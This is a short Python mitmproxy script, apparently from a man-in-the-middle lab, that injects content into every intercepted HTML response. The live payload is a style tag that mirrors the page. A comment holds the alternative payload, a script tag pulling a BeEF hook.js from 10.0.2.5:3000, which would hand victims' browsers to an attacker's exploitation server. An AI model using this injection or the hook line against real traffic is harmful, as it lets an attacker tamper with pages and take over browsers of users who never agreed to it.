from mitmproxy import http


def response(flow: http.HTTPFlow):
    reflector = bytes("<style>body {transform: scaleX(-1);}</style></head>", "UTF-8") # partie beef: <script src='http://10.0.2.5:3000/hook.js'></script>
    flow.response.content = flow.response.content.replace(b"</head>", reflector)
